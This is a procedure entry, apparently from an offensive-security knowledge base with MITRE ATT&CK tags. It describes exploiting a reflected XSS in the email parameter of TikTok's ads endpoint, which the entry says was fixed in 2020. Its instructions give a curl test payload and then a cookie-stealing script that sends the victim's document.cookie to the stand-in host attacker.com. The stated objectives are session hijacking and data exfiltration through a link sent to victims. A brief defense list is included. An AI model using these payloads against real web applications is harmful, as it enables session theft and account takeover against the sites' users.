---
id: proc-uuid-001
tags:
  - xss
  - reflected-xss
  - payload-injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-test]]'
  - '[[commands/curl-xss-exploit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.910Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Email-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability in the email parameter of TikTok's ads endpoint by injecting a malicious JavaScript payload, leading to arbitrary code execution in the victim's browser. It targets insufficient input validation, allowing attackers to hijack sessions or steal data.

## Description

In the context of TikTok's ads platform, the email parameter in the ads endpoint reflects user input directly into the HTML response without proper sanitization or encoding. An attacker can craft a URL with a malicious script in the email parameter and trick a victim into visiting it. Upon rendering, the browser executes the script in the TikTok domain context, enabling actions like cookie theft or phishing. This was reported in 2020 and fixed by August 10, 2020. Prerequisites include basic web knowledge and a way to deliver the link to victims (e.g., email). Expected outcomes: Script execution confirming vulnerability exploitation.

## Requirements

1. Access to a web browser or HTTP client like curl for testing
2. Knowledge of the target endpoint URL (e.g., ads.tiktok.com/endpoint)
3. A server to receive exfiltrated data (for exploitation)
4. Victim interaction via crafted link

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding) for all user inputs
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript in request parameters using WAF rules
- Educate users on phishing avoidance

## Objectives

1. Inject and reflect malicious JavaScript via the email parameter
2. Execute code in the victim's browser to steal session data
3. Exfiltrate sensitive information to an attacker-controlled server

## Instructions

### Step 1: Test for Reflection

**Context**: Verify if the email parameter reflects input without sanitization by sending a benign payload and checking the response.

**Command** ([[commands/curl-xss-test]]):
```bash
curl -X GET "https://ads.tiktok.com/endpoint?email=<script>alert('XSS')</script>" -v
```

> This command sends a GET request with a test script tag. Expected output: The response body contains the raw `<script>` tag, indicating reflection. In a browser, this would trigger an alert.

### Step 2: Craft and Deliver Malicious Payload

**Context**: Build an exploitable payload for data exfiltration and deliver it to the victim.

**Command** ([[commands/curl-xss-exploit]]):
```bash
curl -X GET "https://ads.tiktok.com/endpoint?email=<script>var i=new Image();i.src='http://attacker.com/log?cookie='+encodeURIComponent(document.cookie);</script>" -v
```

> This injects a script that sends the victim's cookies to the attacker's server. Expected output: Response reflects the payload; in browser execution, a network request to attacker.com confirms success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test]]
- [[commands/curl-xss-exploit]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[JavaScript]]
